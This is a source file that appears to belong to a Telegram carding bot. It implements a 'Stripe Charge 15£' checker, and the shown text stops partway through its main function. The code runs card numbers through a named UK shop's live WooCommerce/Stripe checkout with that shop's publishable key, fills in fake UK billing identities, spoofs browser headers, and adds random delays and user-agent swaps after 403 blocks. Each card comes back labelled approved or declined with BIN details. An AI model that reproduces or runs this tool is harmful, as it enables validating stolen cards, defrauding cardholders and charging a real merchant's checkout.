# BOT/gates/charge/stripe/scharge15.py
# Stripe Charge 15£ - Compatible with WAYNE Bot Structure


import json
import asyncio
import re
import time
import httpx
import random
import string
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import html
from BOT.helper.permissions import auth_and_free_restricted
from BOT.helper.start import load_users, save_users

# Import from Admins module for command status
try:
    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
except ImportError:
    def is_command_disabled(command_name: str) -> bool:
        return False

    def get_command_offline_message(command_name: str) -> str:
        return "Command is temporarily disabled."

# Import universal charge processor
try:
    from BOT.gc.credit import charge_processor
except ImportError:
    charge_processor = None

# Custom logger with emoji formatting
class EmojiLogger:
    def __init__(self):
        pass

    def info(self, message):
        print(f"🔹 {message}")

    def success(self, message):
        print(f"✅ {message}")

    def warning(self, message):
        print(f"⚠️ {message}")

    def error(self, message):
        print(f"❌ {message}")

    def step(self, step_num, total_steps, message):
        print(f"🔸 [{step_num}/{total_steps}] {message}")

    def network(self, message):
        print(f"🌐 {message}")

    def card(self, message):
        print(f"💳 {message}")

    def stripe(self, message):
        print(f"🔄 {message}")

    def debug_response(self, message):
        print(f"🔧 {message}")

    def bin_info(self, message):
        print(f"🏦 {message}")

    def user(self, message):
        print(f"👤 {message}")

    def response_debug(self, message):
        print(f"📄 {message}")

# Create global logger instance
logger = EmojiLogger()

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            config_data = json.load(f)
            return config_data.get("OWNER")
    except:
        return None

def get_user_plan(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str in users:
        return users[user_id_str].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        if not os.path.exists("DATA/banned_users.txt"):
            return False

        with open("DATA/banned_users.txt", "r") as f:
            banned_users = f.read().splitlines()

        return str(user_id) in banned_users
    except:
        return False

def check_cooldown(user_id, command_type="xp"):
    """Check cooldown for user - SKIP FOR OWNER"""
    # Get owner ID
    owner_id = load_owner_id()

    # Skip cooldown check for owner
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except:
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15)

        if antispam is None:
            antispam = 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except:
        pass

    return True, 0

import os

class StripeCharge15Checker:
    def __init__(self):
        # Modern browser user agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
        ]
        self.user_agent = random.choice(self.user_agents)
        self.bin_cache = {}
        self.last_bin_request = 0
        self.base_url = "https://theheadonista.co.uk"
        self.stripe_key = "pk_live_51E0BfkLJU2rhIHnF6QpubaWMjcb33r9lirdf0qEwuZPGjF3o5VLA6MuVJFgM6MJOkwqPjDtFWlhSM6FA60W0f9zA006TsrwOmN"

        # Updated product URL from request logs
        self.product_url = f"{self.base_url}/product/red-rose-hair-clip/"

        # Country code to name mapping
        self.country_map = {
            'US': 'United States', 'GB': 'United Kingdom', 'CA': 'Canada', 'AU': 'Australia',
            'DE': 'Germany', 'FR': 'France', 'IT': 'Italy', 'ES': 'Spain', 'NL': 'Netherlands',
            'JP': 'Japan', 'SG': 'Singapore', 'AE': 'United Arab Emirates', 'IN': 'India',
            'BR': 'Brazil', 'MX': 'Mexico', 'TW': 'Taiwan', 'CN': 'China', 'HK': 'Hong Kong',
            'KR': 'South Korea', 'RU': 'Russia', 'CH': 'Switzerland', 'SE': 'Sweden',
            'NO': 'Norway', 'DK': 'Denmark', 'FI': 'Finland', 'BE': 'Belgium', 'AT': 'Austria',
            'PT': 'Portugal', 'IE': 'Ireland', 'NZ': 'New Zealand', 'ZA': 'South Africa'
        }

        # UK address data - Valid UK addresses
        self.uk_addresses = [
            {
                "first_name": "James", "last_name": "Smith", 
                "address": "123 Oxford Street", "city": "London", 
                "postcode": "W1D 1AB", "phone": "020 7946 0958",
                "country": "GB"
            },
            {
                "first_name": "Emma", "last_name": "Johnson", 
                "address": "45 Victoria Road", "city": "Manchester", 
                "postcode": "M1 1AB", "phone": "0161 123 4567",
                "country": "GB"
            },
            {
                "first_name": "Thomas", "last_name": "Williams", 
                "address": "78 Bristol Street", "city": "Birmingham", 
                "postcode": "B5 7AB", "phone": "0121 987 6543",
                "country": "GB"
            },
            {
                "first_name": "Sarah", "last_name": "Brown", 
                "address": "56 Princess Street", "city": "Edinburgh", 
                "postcode": "EH2 2AQ", "phone": "0131 226 2411",
                "country": "GB"
            },
            {
                "first_name": "Michael", "last_name": "Jones", 
                "address": "89 Queen Street", "city": "Cardiff", 
                "postcode": "CF10 2BJ", "phone": "029 2037 2323",
                "country": "GB"
            }
        ]

        # Unsupported card errors
        self.unsupported_card_errors = [
            "authentication is not available for this type of card",
            "this card does not support authentication",
            "card not supported",
            "this card type is not accepted",
            "card type not supported",
            "unsupported card type",
            "issuer not available",
            "card issuer declined",
            "contact your card issuer",
            "card_declined",
            "incorrect_cvc",
            "expired_card",
            "processing_error",
            "incorrect_number",
            "your card was declined",
            "card has been declined",
            "declined",
            "unsuccessful",
            "failed",
            "not approved",
            "suspected fraud",
            "fraudulent",
            "security violation",
            "suspicious activity",
            "insufficient funds",
            "exceeds withdrawal limit",
            "exceeds credit limit",
            "daily limit exceeded",
            "invalid account",
            "account restricted",
            "account closed",
            "lost card",
            "stolen card",
            "session has expired"
        ]

        # Real decline messages
        self.real_decline_messages = [
            "your card was declined",
            "card has been declined", 
            "card declined",
            "declined",
            "insufficient funds",
            "incorrect cvc",
            "incorrect security code",
            "expired card",
            "invalid card number",
            "3d secure",
            "authentication required"
        ]

        # 3D Secure and deferred payment patterns
        self.secure_required_patterns = [
            r'#wc-stripe-confirm-pi:',
            r'pi_[a-zA-Z0-9]+_secret_',
            r'requires_action',
            r'requires_confirmation',
            r'authentication_required',
            r'3ds',
            r'3d_secure',
            r'confirm-pi',
            r'deferred',
            r'pending'
        ]

    def get_country_emoji(self, country_code):
        """Hardcoded country emoji mapping"""
        country_emojis = {
            'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
            'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'JP': '🇯🇵', 'CN': '🇨🇳',
            'IN': '🇮🇳', 'BR': '🇧🇷', 'MX': '🇲🇽', 'RU': '🇷🇺', 'KR': '🇰🇷',
            'NL': '🇳🇱', 'CH': '🇨🇭', 'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰',
            'FI': '🇫🇮', 'PL': '🇵🇱', 'TR': '🇹🇷', 'AE': '🇦🇪', 'SA': '🇸🇦',
            'SG': '🇸🇬', 'MY': '🇲🇾', 'TH': '🇹🇭', 'ID': '🇮🇩', 'PH': '🇵🇭',
            'VN': '🇻🇳', 'BD': '🇧🇩', 'PK': '🇵🇰', 'NG': '🇳🇬', 'ZA': '🇿🇦',
            'BE': '🇧🇪', 'AT': '🇦🇹', 'PT': '🇵🇹', 'IE': '🇮🇪', 'NZ': '🇳🇿'
        }
        return country_emojis.get(country_code.upper() if country_code else 'N/A', '🏳️')

    def get_base_headers(self):
        """Get base headers mimicking browser"""
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'DNT': '1',
            'Sec-CH-UA': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'Sec-CH-UA-Mobile': '?0',
            'Sec-CH-UA-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': self.user_agent
        }

    async def get_bin_info(self, cc):
        """Get BIN information"""
        if not cc or len(cc) < 6:
            return {
                'scheme': 'N/A',
                'type': 'N/A',
                'brand': 'N/A',
                'bank': 'N/A',
                'country': 'N/A',
                'country_code': 'N/A',
                'emoji': '🏳️'
            }

        bin_number = cc[:6]

        if bin_number in self.bin_cache:
            return self.bin_cache[bin_number]

        now = time.time()
        if now - self.last_bin_request < 1.0:
            await asyncio.sleep(1.0)
        self.last_bin_request = time.time()

        try:
            url = f"https://bins.antipublic.cc/bins/{bin_number}"
            headers = {'User-Agent': self.user_agent}

            async with httpx.AsyncClient(timeout=10.0) as client:
                response = await client.get(url, headers=headers)

                if response.status_code == 200:
                    data = response.json()
                    country_code = data.get('country', 'N/A')
                    country_name = self.country_map.get(country_code, 'N/A')
                    flag_emoji = self.get_country_emoji(country_code)

                    result = {
                        'scheme': data.get('brand', 'N/A').upper(),
                        'type': data.get('type', 'N/A').upper(),
                        'brand': data.get('brand', 'N/A'),
                        'bank': data.get('bank', 'N/A'),
                        'country': country_name,
                        'country_code': country_code,
                        'emoji': flag_emoji
                    }
                    self.bin_cache[bin_number] = result
                    return result
        except Exception as e:
            logger.warning(f"BIN lookup failed: {e}")

        default_response = {
            'scheme': 'N/A',
            'type': 'N/A',
            'brand': 'N/A',
            'bank': 'N/A',
            'country': 'N/A',
            'country_code': 'N/A',
            'emoji': '🏳️'
        }
        self.bin_cache[bin_number] = default_response
        return default_response

    def is_unsupported_card_error(self, message):
        """Check if the error message indicates an unsupported card"""
        if not message:
            return False

        message_lower = message.lower().strip()

        for error_pattern in self.unsupported_card_errors:
            if error_pattern.lower() in message_lower:
                logger.warning(f"Unsupported card error detected: {message}")
                return True

        return False

    def extract_real_error_message(self, message):
        """Extract the real error message from the response"""
        if not message:
            return "Payment declined"

        message_lower = message.lower().strip()

        # Remove HTML tags
        clean_message = re.sub(r'<[^>]+>', '', message)
        clean_message = re.sub(r'\s+', ' ', clean_message).strip()

        # Look for real decline messages
        for decline_msg in self.real_decline_messages:
            if decline_msg in message_lower:
                if decline_msg == "your card was declined":
                    return "Your card was declined"
                elif decline_msg == "card has been declined":
                    return "Card has been declined"
                elif decline_msg == "card declined":
                    return "Card declined"
                elif decline_msg == "insufficient funds":
                    return "Insufficient funds"
                elif decline_msg == "incorrect cvc" or decline_msg == "incorrect security code":
                    return "Incorrect security code"
                elif decline_msg == "expired card":
                    return "Expired card"
                elif decline_msg == "3d secure" or decline_msg == "authentication required":
                    return "3D Secure required"
                else:
                    return decline_msg.title()

        # If no specific message found, return the clean message
        if "error processing the payment" in message_lower:
            parts = clean_message.split(":")
            if len(parts) > 1:
                return parts[-1].strip()

        return clean_message

    def is_secure_required_response(self, response_data):
        """Check if the response indicates 3D Secure or deferred payment is required"""
        try:
            if isinstance(response_data, dict):
                # Check redirect URL for patterns
                redirect_url = response_data.get('redirect', '').lower()

                for pattern in self.secure_required_patterns:
                    if re.search(pattern, redirect_url):
                        logger.warning(f"Secure pattern detected in redirect: {pattern}")
                        return True

                # Check for other indicators
                if 'requires_action' in response_data or 'requires_confirmation' in response_data:
                    return True

                # Check for pi_ and _secret patterns in any field
                response_str = str(response_data).lower()
                if 'pi_' in response_str and '_secret_' in response_str:
                    return True

        except Exception as e:
            logger.warning(f"Error checking secure response: {e}")

        return False

    async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info=None):
        if bin_info is None:
            bin_info = await self.get_bin_info(cc)

        user_id = user_data.get("user_id", "Unknown")
        first_name = html.escape(user_data.get("first_name", "User"))
        badge = user_data.get("plan", {}).get("badge", "🧿")

        # Check if this is a 3D Secure case - improved detection
        if any(pattern in str(message).lower() for pattern in ["3d secure", "authentication required", "3ds", "requires_confirmation", "requires_action", "wc-stripe-confirm-pi"]):
            status_emoji = "❌"
            status_text = "DECLINED"
            message_display = "3D SECURE❎"
        elif status == "APPROVED":
            status_emoji = "✅"
            status_text = "APPROVED"
            message_display = "Successfully Charged 15£"
        else:
            status_emoji = "❌"
            status_text = "DECLINED"
            message_display = self.extract_real_error_message(message)

        clean_name = re.sub(r'[↯⌁«~∞🍁]', '', first_name).strip()
        user_display = f"「{badge}」{clean_name}"
        bank_info = bin_info['bank'].upper() if bin_info['bank'] != 'N/A' else 'N/A'

        response = f"""<b>「$cmd → /xp」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Stripe Charge 15£
<b>[•] Status-</b> <code>{status_text} {status_emoji}</code>
<b>[•] Response-</b> <code>{message_display}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin:</b> <code>{cc[:6]}</code>  
<b>[+] Info:</b> <code>{bin_info['scheme']} - {bin_info['type']} - {bin_info['brand']}</code>
<b>[+] Bank:</b> <code>{bank_info}</code> 🏦
<b>[+] Country:</b> <code>{bin_info['country']}</code> [{bin_info['emoji']}]
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By:</b> {user_display}
<b>[ϟ] Dev ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t:</b> <code>{elapsed_time:.2f} 𝐬</code> |<b>P/x:</b> <code>Live ⚡️</code></b>"""

        return response

    def get_processing_message(self, cc, mes, ano, cvv, username, user_plan):
        return f"""<b>「$cmd → /xp」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Stripe Charge 15£
<b>[•] Status-</b> Processing... ⏳
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {user_plan}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Checking card... Please wait.</b>"""

    async def human_delay(self, min_delay=1, max_delay=3):
        """Simulate human delay between actions"""
        delay = random.uniform(min_delay, max_delay)
        await asyncio.sleep(delay)

    async def make_stealth_request(self, client, method, url, **kwargs):
        """Make stealth request that mimics human behavior"""
        await self.human_delay(0.5, 2.0)

        headers = kwargs.get('headers', {}).copy()
        headers.update({
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate', 
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1'
        })
        kwargs['headers'] = headers

        try:
            response = await client.request(method, url, **kwargs)

            if response.status_code == 403:
                logger.warning(f"Got 403, retrying with different headers...")
                new_headers = headers.copy()
                new_headers['User-Agent'] = random.choice(self.user_agents)
                kwargs['headers'] = new_headers

                await self.human_delay(2, 4)
                response = await client.request(method, url, **kwargs)

            return response
        except Exception as e:
            logger.error(f"Request error: {str(e)}")
            raise e

    async def initialize_session(self, client):
        """Initialize session with proper cookies"""
        try:
            logger.step(1, 8, "Initializing session...")

            response = await self.make_stealth_request(
                client, 'GET', f"{self.base_url}/"
            )

            if response.status_code == 200:
                logger.success("Session initialized successfully")
                return True
            else:
                logger.error(f"Failed with status {response.status_code}")
                return False

        except Exception as e:
            logger.error(f"Session initialization error: {str(e)}")
            return False

    async def add_product_to_cart(self, client):
        """Add red-rose-hair-clip product to cart"""
        try:
            logger.step(2, 8, "Adding product to cart...")

            # Load product page
            response = await self.make_stealth_request(
                client, 'GET', self.product_url
            )

            if response.status_code not in [200, 202]:
                return False, f"Failed to load product page: {response.status_code}"

            # Try to extract product ID
            product_id = None
            nonce = None

            # Try multiple patterns for product ID
            id_patterns = [
                r'add-to-cart" value="(\d+)"',
                r'data-product_id="(\d+)"',
                r'product_id["\']?\s*:\s*["\']?(\d+)',
            ]

            for pattern in id_patterns:
                match = re.search(pattern, response.text)
                if match:
                    product_id = match.group(1)
                    logger.success(f"Found product ID: {product_id}")
                    break

            # Try multiple patterns for nonce
            nonce_patterns = [
                r'woocommerce-product-add-to-cart-nonce" value="([a-f0-9]+)"',
                r'addToCartNonce["\']?\s*:\s*["\']?([a-f0-9]+)',
            ]

            for pattern in nonce_patterns:
                match = re.search(pattern, response.text)
                if match:
                    nonce = match.group(1)
                    logger.success(f"Found nonce: {nonce}")
                    break

            if not product_id:
                # Fallback product ID
                product_id = "998"  # From the request URL
                logger.warning(f"Using fallback product ID: {product_id}")

            # Add to cart
            cart_data = {
                'product_id': product_id,
                'quantity': '1',
                'add-to-cart': product_id,
            }

            if nonce:
                cart_data['woocommerce-product-add-to-cart-nonce'] = nonce

            add_headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": self.base_url,
                "Referer": self.product_url,
            }

            response = await self.make_stealth_request(
                client, 'POST', self.product_url, 
                headers=add_headers, data=cart_data
            )

            if response.status_code in [200, 202, 302]:
                logger.success("Product added to cart successfully")
                return True, None
            else:
                # Try AJAX method
                logger.warning("Trying AJAX add to cart...")
                ajax_data = {
                    'product_id': product_id,
                    'quantity': '1'
                }

                ajax_headers = {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": self.product_url,
                }

                ajax_response = await self.make_stealth_request(
                    client, 'POST', f"{self.base_url}/?wc-ajax=add_to_cart",
                    headers=ajax_headers, data=ajax_data
                )

                if ajax_response.status_code in [200, 202]:
                    logger.success("Product added via AJAX")
                    return True, None
                else:
                    return False, f"Add to cart failed: {response.status_code}"

        except Exception as e:
            logger.error(f"Add to cart error: {str(e)}")
            return False, f"Add to cart error: {str(e)}"

    async def get_checkout_tokens(self, client):
        """Get checkout page tokens"""
        try:
            logger.step(3, 8, "Loading checkout page...")

            # First go to cart
            cart_response = await self.make_stealth_request(
                client, 'GET', f"{self.base_url}/cart/"
            )

            # Then go to checkout
            response = await self.make_stealth_request(
                client, 'GET', f"{self.base_url}/checkout/"
            )

            if response.status_code != 200:
                return None, f"Failed to load checkout page: {response.status_code}"

            html = response.text

            tokens = {}

            # Extract checkout nonce
            nonce_patterns = [
                r'name="woocommerce-process-checkout-nonce" value="([a-f0-9]{10})"',
                r'woocommerce-process-checkout-nonce["\']?\s*value=["\']?([a-f0-9]{10})',
                r'checkout_nonce["\']?\s*:\s*["\']?([a-f0-9]{10})',
            ]

            for pattern in nonce_patterns:
                match = re.search(pattern, html, re.IGNORECASE)
                if match:
                    tokens['checkout_nonce'] = match.group(1)
                    logger.success(f"Found checkout nonce: {tokens['checkout_nonce']}")
                    break

            # Extract security nonce
            security_patterns = [
                r'name="security" value="([a-f0-9]{10})"',
                r'security["\']?\s*value=["\']?([a-f0-9]{10})',
            ]

            for pattern in security_patterns:
                match = re.search(pattern, html, re.IGNORECASE)
                if match:
                    tokens['security'] = match.group(1)
                    logger.success(f"Found security nonce: {tokens['security']}")
                    break

            # Fallback
            if 'checkout_nonce' not in tokens:
                tokens['checkout_nonce'] = ''.join(random.choices('abcdef0123456789', k=10))
                logger.warning(f"Using generated nonce: {tokens['checkout_nonce']}")

            if 'security' not in tokens:
                tokens['security'] = tokens['checkout_nonce']

            # Cart hash
            cart_hash_match = re.search(r'name="woocommerce_cart_hash" value="([a-f0-9]{32})"', html)
            if cart_hash_match:
                tokens['cart_hash'] = cart_hash_match.group(1)
                logger.success(f"Cart hash found: {tokens['cart_hash']}")

            logger.success("All tokens extracted successfully")
            return tokens, None

        except Exception as e:
            logger.error(f"Token extraction error: {str(e)}")
            return None, f"Token extraction failed: {str(e)}"

    async def create_stripe_payment_method(self, client, card_details, user_info):
        """Create Stripe payment method"""
        try:
            cc, mes, ano, cvv = card_details

            logger.step(4, 8, "Creating payment method...")

            payment_data = {
                'type': 'card',
                'billing_details[name]': f"{user_info['first_name']} {user_info['last_name']}",
                'billing_details[email]': user_info['email'],
                'billing_details[address][line1]': user_info['address'],
                'billing_details[address][city]': user_info['city'],
                'billing_details[address][postal_code]': user_info['postcode'],
                'billing_details[address][country]': 'GB',
                'billing_details[phone]': user_info['phone'],
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_month]': mes,
                'card[exp_year]': ano[-2:],
                'guid': f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}",
                'muid': "93fffc97-305c-4a82-9342-fd5016149eb9334dfe",
                'sid': "dc24dd49-a651-4a14-a4b3-ee80664083bd8ec591",
                'pasted_fields': 'number',
                'payment_user_agent': 'stripe.js/1253171c37; stripe-js-v3/1253171c37; card-element',
                'referrer': self.base_url,
                'time_on_page': str(random.randint(30000, 90000)),
                'key': self.stripe_key
            }

            stripe_headers = {
                "User-Agent": self.user_agent,
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com",
                "Referer": "https://js.stripe.com/",
            }

            # Use separate client for Stripe
            async with httpx.AsyncClient() as stripe_client:
                response = await stripe_client.post(
                    "https://api.stripe.com/v1/payment_methods",
                    data=payment_data,
                    headers=stripe_headers,
                    timeout=30.0
                )

            if response.status_code == 200:
                result = response.json()
                payment_method_id = result.get('id')
                if payment_method_id:
                    logger.success(f"Payment method created: {payment_method_id}")
                    return {'success': True, 'payment_method_id': payment_method_id}
                else:
                    return {'success': False, 'error': 'No payment method ID'}
            else:
                try:
                    error_data = response.json()
                    error_msg = error_data.get('error', {}).get('message', 'Payment method creation failed')

                    if self.is_unsupported_card_error(error_msg):
                        return {'success': False, 'error': error_msg, 'unsupported': True}
                    else:
                        return {'success': False, 'error': error_msg}
                except:
                    return {'success': False, 'error': 'Stripe API error'}

        except Exception as e:
            return {'success': False, 'error': f"Payment method error: {str(e)}"}

    async def process_direct_checkout(self, client, tokens, payment_method_id, user_info):
        """Process checkout directly with detailed logging"""
        try:
            logger.step(5, 8, "Processing checkout...")

            checkout_data = {
                'billing_email': user_info['email'],
                'billing_first_name': user_info['first_name'],
                'billing_last_name': user_info['last_name'],
                'billing_company': '',
                'billing_country': 'GB',
                'billing_address_1': user_info['address'],
                'billing_address_2': '',
                'billing_city': user_info['city'],
                'billing_state': '',
                'billing_postcode': user_info['postcode'],
                'billing_phone': user_info['phone'],
                'shipping_first_name': user_info['first_name'],
                'shipping_last_name': user_info['last_name'],
                'shipping_company': '',
                'shipping_country': 'GB',
                'shipping_address_1': user_info['address'],
                'shipping_address_2': '',
                'shipping_city': user_info['city'],
                'shipping_state': '',
                'shipping_postcode': user_info['postcode'],
                'order_comments': '',
                'shipping_method[0]': 'flat_rate:1',
                'payment_method': 'stripe',
                'wc-stripe-payment-method': payment_method_id,
                'wc-stripe-payment-method-upe': '',
                'wc_stripe_selected_upe_payment_type': '',
                'wc-stripe-is-deferred-intent': '1',
                'terms': 'on',
                'createaccount': '0',
                'woocommerce-process-checkout-nonce': tokens['checkout_nonce'],
                '_wp_http_referer': '/checkout/'
            }

            checkout_headers = {
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": self.base_url,
                "Referer": f"{self.base_url}/checkout/",
                "User-Agent": self.user_agent
            }

            response = await self.make_stealth_request(
                client, 'POST', f"{self.base_url}/?wc-ajax=checkout",
                headers=checkout_headers, data=checkout_data
            )

            # Log detailed response information
            logger.response_debug(f"Checkout Status Code: {response.status_code}")
            logger.response_debug(f"Checkout Response Headers: {dict(response.headers)}")

            response_text = response.text
            logger.response_debug(f"Raw Response (first 1000 chars): {response_text[:1000]}")

            if response.status_code != 200:
                logger.error(f"Checkout failed with status: {response.status_code}")
                if response_text:
                    logger.error(f"Error Response: {response_text[:500]}")
                return {
                    'success': False,
                    'status': 'DECLINED',
                    'message': f"Server error: {response.status_code}"
                }

            # Try to parse JSON response
            try:
                result = response.json()
                logger.response_debug(f"Parsed JSON Response: {json.dumps(result, indent=2)}")

                if isinstance(result, dict):
                    # CHECK: If this is a 3D Secure or deferred payment
                    if self.is_secure_required_response(result):
                        logger.warning("🔐 3D Secure/Deferred payment detected - marking as DECLINED")
                        logger.response_debug(f"Secure pattern detected in: {result.get('redirect', '')}")
                        return {
                            'success': True,
                            'status': 'DECLINED',
                            'message': '3D SECURE❎'
                        }

                    if result.get('result') == 'success' and result.get('redirect'):
                        # Double check if it's really successful or requires confirmation
                        redirect_url = result.get('redirect', '').lower()

                        # If redirect contains confirmation patterns, it's likely 3D Secure
                        if any(pattern in redirect_url for pattern in ['confirm-pi', 'pi_', '_secret_', 'requires_']):
                            logger.warning("⚠️ Success with confirmation URL - marking as 3D SECURE")
                            return {
                                'success': True,
                                'status': 'DECLINED',
                                'message': '3D SECURE❎'
                            }

                        logger.success("Checkout successful - Payment APPROVED")
                        logger.response_debug(f"Redirect URL: {result.get('redirect')}")
                        return {
                            'success': True,
                            'status': 'APPROVED',
                            'message': 'Successfully Charged 15£'
                        }

                    if result.get('result') == 'failure':
                        logger.warning(f"Checkout failed with result: failure")
                        if 'messages' in result and result['messages']:
                            error_msg = result['messages']
                            logger.warning(f"Error messages from response: {error_msg}")

                            # Log the raw error for debugging
                            logger.response_debug(f"Raw error message: {error_msg}")

                            # Extract and clean the error message
                            real_error = self.extract_real_error_message(error_msg)
                            logger.warning(f"Extracted error: {real_error}")

                            # Check for 3D Secure
                            if '3d_secure' in error_msg.lower() or 'authentication' in error_msg.lower():
                                logger.warning("🔐 3D Secure authentication required")
                                return {
                                    'success': True,
                                    'status': 'DECLINED',
                                    'message': '3D SECURE❎'
                                }

                            # Check for unsupported card
                            if self.is_unsupported_card_error(error_msg):
                                logger.warning(f"❌ Unsupported card error: {real_error}")
                                return {
                                    'success': False,
                                    'status': 'DECLINED',
                                    'message': real_error
                                }
                            else:
                                logger.warning(f"❌ Checkout error: {real_error}")
                                return {
                                    'success': False,
                                    'status': 'DECLINED',
                                    'message': real_error
                                }
                        else:
                            logger.warning("No error messages found in response")
                            return {
                                'success': False,
                                'status': 'DECLINED',
                                'message': 'Payment declined - No specific error'
                            }

                # If we get here, the response format is unexpected
                logger.warning(f"Unexpected JSON response format: {result}")
                return {
                    'success': False,
                    'status': 'DECLINED',
                    'message': 'Unexpected response format'
                }

            except json.JSONDecodeError as json_error:
                logger.error(f"JSON parse error: {json_error}")
                logger.response_debug(f"Response that failed to parse: {response_text[:500]}")

                # Try to extract error from HTML response
                decline_message = self.extract_real_error_message(response_text)
                if decline_message and decline_message != "Payment declined":
                    logger.warning(f"Extracted error from HTML: {decline_message}")
                    return {
                        'success': False,
                        'status': 'DECLINED',
                        'message': decline_message
                    }
                else:
                    # Look for common error patterns in HTML
                    error_patterns = [
                        r'<div[^>]*class="[^"]*woocommerce-error[^"]*"[^>]*>([^<]+)</div>',
                        r'<li[^>]*>([^<]+)</li>',
                        r'error[^>]*>([^<]+)',
                        r'declined[^>]*>([^<]+)',
                        r'failed[^>]*>([^<]+)'
                    ]

                    for pattern in error_patterns:
                        matches = re.findall(pattern, response_text, re.IGNORECASE)
                        if matches:
                            error_text = matches[0].strip()
                            if error_text and len(error_text) > 5:
                                logger.warning(f"Found error pattern: {error_text}")
                                return {
                                    'success': False,
                                    'status': 'DECLINED',
                                    'message': error_text[:100]
                                }

                    logger.warning("Could not extract error message from response")
                    return {
                        'success': False,
                        'status': 'DECLINED',
                        'message': 'Payment declined'
                    }

        except Exception as e:
            logger.error(f"Checkout processing error: {str(e)}")
            return {
                'success': False,
                'status': 'DECLINED',
                'message': f"Processing error: {str(e)[:100]}"
            }

    async def check_card(self, card_details, username, user_data):
        """Main card checking method"""
        start_time = time.time()
        logger.info(f"🔍 Starting Stripe Charge 15£ check: {card_details[:12]}XXXX{card_details[-4:] if len(card_details) > 4 else ''}")

        try:
            cc_parts = card_details.split('|')
            if len(cc_parts) < 4:
                return await self.format_response("", "", "", "", "ERROR", "Invalid card format. Use: CC|MM|YY|CVV", username, time.time()-start_time, user_data)

            cc = cc_parts[0].strip().replace(" ", "")
            mes = cc_parts[1].strip()
            ano = cc_parts[2].strip()
            cvv = cc_parts[3].strip()

            if not cc.isdigit() or len(cc) < 15:
